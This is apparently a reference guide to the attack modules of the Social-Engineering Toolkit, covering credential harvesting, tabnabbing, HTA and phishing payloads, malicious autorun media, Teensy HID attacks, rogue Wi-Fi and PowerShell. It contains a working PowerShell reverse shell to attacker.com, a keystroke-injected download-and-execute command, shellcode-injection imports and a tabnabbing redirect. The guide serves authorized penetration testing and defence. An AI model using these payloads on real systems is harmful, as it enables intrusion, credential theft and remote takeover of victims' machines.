# Attack Modules Reference Guide

## Overview

This document provides detailed information about SET's attack modules, their capabilities, and implementation details.

## Web Attack Vectors

### 1. Java Applet Attack Vector

**Location**: `src/webattack/java_applet/`

**Description**: Creates malicious Java applets that exploit client-side vulnerabilities.

**Key Functions**:
```python
def java_applet_attack(website, port, directory)
```

**Attack Flow**:
1. Clone target website
2. Inject malicious Java applet
3. Generate signed JAR file
4. Host modified website
5. Capture reverse connections

**Configuration Options**:
- Custom or template websites
- Payload selection (Meterpreter, shell, etc.)
- Port configuration
- SSL/TLS support

**Usage Example**:
```bash
# Menu Path: 1 > 2 > 1 > 2
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 1) Java Applet Attack Method
# 2) Site Cloner
```

### 2. Browser Exploit Attack Vector

**Location**: `src/webattack/browser_exploits/`

**Description**: Exploits browser vulnerabilities for client-side attacks.

**Supported Exploits**:
- Internet Explorer vulnerabilities
- Firefox vulnerabilities  
- Chrome/Safari exploits
- Plugin-based exploits (Flash, PDF, etc.)

**Key Components**:
- Exploit database integration
- Automatic exploit selection
- Multi-browser targeting
- Payload integration

### 3. Credential Harvester

**Location**: `src/webattack/harvester/`

**Description**: Captures user credentials through cloned login pages.

**Core Classes**:

```python
class SETHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Serves cloned website pages"""
        
    def do_POST(self):
        """Captures submitted credentials"""
        
    def log_message(self, format, *args):
        """Custom logging for captured data"""
```

**Features**:
- Real-time credential capture
- Multiple site templates
- Custom site cloning
- Report generation
- SSL/HTTPS support

**Captured Data Format**:
```
[*] WEB FORM POSTED TO: /login.php
[*] POSSIBLE USERNAME FIELD FOUND: username=admin
[*] POSSIBLE PASSWORD FIELD FOUND: password=secret123
[*] POSSIBLE EMAIL FIELD FOUND: email=admin@company.com
```

### 4. Tabnabbing Attack

**Location**: `src/webattack/tabnabbing/`

**Description**: Exploits user behavior by changing inactive browser tabs.

**Attack Mechanism**:
1. User visits legitimate-looking page
2. Page detects when tab becomes inactive
3. Silently redirects to fake login page
4. User returns to "updated" login page
5. Credentials captured when user logs in

**Implementation**:
```javascript
// Simplified tabnabbing detection
window.onblur = function() {
    setTimeout(function() {
        if (document.hidden) {
            window.location = "fake_login.html";
        }
    }, 2000);
};
```

### 5. Multi-Attack Vector

**Location**: `src/webattack/multi_attack/`

**Description**: Combines multiple attack vectors for increased success rate.

**Key Functions**:

```python
def flag_on(vector):
    """Enable specific attack vector"""
    
def flag_off(vector):
    """Disable specific attack vector"""
    
def write_file(filename, results):
    """Write attack results to file"""
```

**Supported Combinations**:
- Java Applet + Browser Exploit
- Credential Harvester + Tabnabbing
- Multiple payload delivery methods
- Fallback attack mechanisms

### 6. HTA (HTML Application) Attack

**Location**: `src/webattack/hta/`

**Description**: Uses Microsoft HTA files for payload delivery.

**Key Function**:
```python
def gen_hta_cool_stuff():
    """Generate malicious HTA files"""
```

**Attack Vector**:
- Creates .hta files that execute with full system privileges
- Bypasses many security restrictions
- Effective against Windows targets
- Can deliver various payload types

## Spear-Phishing Attack Vectors

### 1. Mass Email Attack

**Location**: `src/core/msf_attacks/create_payload.py`

**Description**: Creates and distributes malicious email attachments.

**Supported File Formats**:
- PDF exploits
- Microsoft Office documents
- Executable files
- Archive files with payloads

**Email Integration**:
- SMTP server configuration
- Email template customization
- Attachment handling
- Recipient list management

### 2. FileFormat Payload Creation

**Features**:
- Metasploit integration for exploit generation
- Custom payload embedding
- Multiple file format support
- Anti-virus evasion techniques

**Example Payloads**:
```bash
# PDF Exploits
adobe_pdf_embedded_exe
adobe_pdf_javascript_api

# Office Exploits  
ms_office_word_hta
ms_office_excel_dde

# Archive Exploits
zip_payload_delivery
rar_embedded_executable
```

## Infectious Media Generator

**Location**: `src/autorun/`

**Description**: Creates auto-executing malicious media (USB/CD).

**Components**:

### AutoLaunch (`src/autorun/autolaunch.py`)

**Purpose**: Generates autorun files for removable media.

**Supported Media Types**:
- USB drives
- CD/DVD media
- Network shares
- Portable applications

**Autorun Methods**:
```ini
# Windows Autorun.inf
[autorun]
open=payload.exe
icon=icon.ico
label=Important Documents

# Cross-platform execution
# Uses multiple trigger methods for reliability
```

**Payload Integration**:
- Executable payloads
- Script-based payloads
- Document-based attacks
- Social engineering elements

## Teensy/Arduino Attack Vectors

**Location**: `src/teensy/`

**Description**: Hardware-based attacks using USB HID devices.

### Core Components

#### Teensy Generator (`src/teensy/teensy.py`)

**Supported Attack Types**:

1. **Powershell Download and Execute**
   ```arduino
   // Downloads and executes powershell payload
   Keyboard.print("powershell -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"");
   ```

2. **Binary to Teensy Conversion** (`src/teensy/binary2teensy.py`)
   - Converts executable files to Arduino code
   - Embeds payloads in HID device firmware
   - Supports large binary files through chunking

3. **SD Card to Teensy** (`src/teensy/sd2teensy.py`)
   - Reads payloads from SD card
   - Dynamic payload selection
   - Steganographic payload hiding

#### Supported Platforms

**Windows Attacks**:
- CMD/Powershell execution
- Registry modifications
- File system operations
- Network reconnaissance

**Linux/Mac Attacks**:
- Terminal command execution
- Script downloads
- System enumeration
- Persistence mechanisms

### HID Attack Categories

1. **Information Gathering**
   - System enumeration
   - Network discovery
   - Credential extraction
   - Screenshot capture

2. **Payload Delivery**
   - Remote shell establishment
   - Backdoor installation
   - Malware deployment
   - Persistence creation

3. **Data Exfiltration**
   - File system access
   - Database extraction
   - Email harvesting
   - Document theft

## Wireless Attack Vectors

**Location**: `src/wireless/`

**Description**: Wireless network attacks and rogue access points.

### WiFi Attack (`src/wireless/wifiattack.py`)

**Attack Types**:

1. **Rogue Access Point**
   - Creates fake WiFi hotspots
   - Captures network traffic
   - Performs man-in-the-middle attacks
   - Delivers client-side exploits

2. **Captive Portal Attacks**
   - Forces authentication pages
   - Captures credentials
   - Delivers malicious content
   - Social engineering integration

**Dependencies**:
- airbase-ng (Access point creation)
- dnsspoof (DNS redirection)
- Apache (Web server)
- iptables (Traffic routing)

**Configuration**:
```bash
# Wireless interface setup
WIRELESS_INTERFACE=wlan0
INTERNET_INTERFACE=eth0

# Access point settings
AP_NAME="Free_WiFi"
AP_CHANNEL=6
AP_ENCRYPTION=none
```

## PowerShell Attack Vectors

**Location**: `src/powershell/`

**Description**: PowerShell-based attacks and payload delivery.

### PowerShell Module (`src/powershell/powershell.py`)

**Attack Categories**:

1. **Encoded Commands**
   - Base64 encoded payloads
   - Obfuscated execution
   - Memory-only attacks
   - Fileless malware

2. **Shellcode Injection**
   - Direct memory injection
   - Process hollowing
   - DLL injection
   - Reflective loading

3. **Download and Execute**
   - Remote payload fetching
   - In-memory execution
   - Staged payloads
   - Multi-stage attacks

**Example Payloads**:

```powershell
# Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient("attacker.com",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

# Shellcode Injection
$code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@
```

## QR Code Attack Vector

**Location**: `src/qrcode/`

**Description**: QR code generation for social engineering attacks.

### QR Generator (`src/qrcode/qrgenerator.py`)

**Use Cases**:
- Malicious URL distribution
- WiFi network credentials
- Contact information with payloads
- Social media profile attacks

**Integration Points**:
- Works with all SET attack vectors
- Can encode any URL or text
- Supports various output formats
- Customizable appearance

## Third-Party Module Framework

**Location**: `src/core/module_handler.py`

**Description**: Framework for loading and executing custom attack modules.

### Module Structure

```python
# Required module format
MAIN = "Module Description"  # Required variable

def main():
    """Required main function"""
    # Module implementation
    pass

# Optional helper functions
def custom_function():
    """Custom module functionality"""
    pass
```

### Available Third-Party Modules

#### 1. Google Analytics Attack (`modules/google_analytics_attack.py`)

**Purpose**: Exploits Google Analytics for information gathering.

**Capabilities**:
- Website visitor tracking
- User behavior analysis
- Geographic information gathering
- Technology stack identification

#### 2. RATTE Module (`modules/ratte_module.py`)

**Purpose**: Remote Administration Tool functionality.

**Features**:
- Remote command execution
- File system access
- Screen capture
- Keylogging capabilities
- Network reconnaissance

#### 3. RATTE Only Module (`modules/ratte_only_module.py`)

**Purpose**: Standalone RATTE deployment.

**Differences from full RATTE**:
- Lighter footprint
- Specific functionality subset
- Stealth-focused operations
- Minimal dependencies

## Attack Module Integration

### Common Integration Patterns

1. **Payload Integration**
   ```python
   # Most modules integrate with payload generation
   from src.core.payloadgen.create_payloads import *
   payload_path = generate_payload(payload_type, lhost, lport)
   ```

2. **Web Server Integration**
   ```python
   # Web-based attacks use the built-in server
   from src.core.setcore import start_web_server
   start_web_server("/path/to/attack/files")
   ```

3. **Configuration Integration**
   ```python
   # Modules use centralized configuration
   from src.core.setcore import check_config, update_options
   ip_address = check_config("IPADDR=")
   update_options("ATTACK_VECTOR=custom")
   ```

### Error Handling

```python
# Standard error handling pattern
try:
    # Attack module logic
    execute_attack()
except KeyboardInterrupt:
    print("[!] Attack interrupted by user")
    cleanup_routine()
except Exception as e:
    print(f"[!] Error in attack module: {str(e)}")
    log(e)
    return_continue()
```

## Security Considerations

### Attack Module Security

1. **Input Validation**
   - All user inputs must be validated
   - Prevent code injection attacks
   - Sanitize file paths and URLs

2. **Error Handling**
   - Graceful failure handling
   - No sensitive information in error messages
   - Proper cleanup on failure

3. **Logging**
   - Comprehensive activity logging
   - Audit trail maintenance
   - Evidence preservation

### Defensive Recommendations

1. **Network Security**
   - Monitor for suspicious network patterns
   - Implement network segmentation
   - Deploy intrusion detection systems

2. **Endpoint Protection**
   - Anti-malware solutions
   - Application whitelisting
   - Behavioral analysis tools

3. **User Education**
   - Security awareness training
   - Phishing simulation exercises
   - Incident response procedures

---

*This reference guide covers the technical implementation details of SET's attack modules. Always ensure proper authorization before using these tools.*